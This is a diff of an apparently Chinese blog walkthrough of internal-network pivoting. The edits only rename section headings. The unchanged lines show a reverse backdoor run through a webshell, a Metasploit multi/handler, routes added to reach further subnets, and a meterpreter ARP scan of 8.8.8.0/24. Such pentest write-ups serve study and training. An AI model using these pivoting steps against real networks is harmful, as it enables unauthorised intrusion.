@@ -129,7 +129,7 @@
 
         
 
-        <span itemprop="articleBody"><h3 id="about">About</h3>
+        <span itemprop="articleBody"><h3 id="0x00-about">0x00 About</h3>
 
 <div class="highlighter-rouge"><pre class="highlight"><code>内网机器如下:
 </code></pre>
@@ -145,7 +145,7 @@
 </code></pre>
 </div>
 
-<h3 id="step1">Step1</h3>
+<h3 id="0x01-step1">0x01 Step1</h3>
 
 <p>Attacker在RD上通过webshell运行了一个reverse类型的后门,然后操作如下:</p>
 <div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/multi/handler 
@@ -187,7 +187,7 @@ IPv4 Netmask : 255.255.255.0
 </code></pre>
 </div>
 
-<h3 id="step2">Step2</h3>
+<h3 id="0x02-step2">0x02 Step2</h3>
 
 <font color="#33ccff">
 发现RD有两块网卡后,想办法渗透另一个网段7.7.7.0,首先要添加路由[不添加路由也可以直接用meterpreter shell中的模块访问
@@ -563,7 +563,7 @@ meterpreter &gt;
 </div>
 <p>发现又出现一个8.8.8.x的网段,于是将这个网段添加路由,以便msf中的模块可以访问到8.8.8.x网段</p>
 
-<h3 id="step3">Step3</h3>
+<h3 id="0x03-step3">0x03 Step3</h3>
 
 <p>先直接用新的meterpreter shell看看8.8.8.x这个网段有什么机器</p>
 <div class="highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24
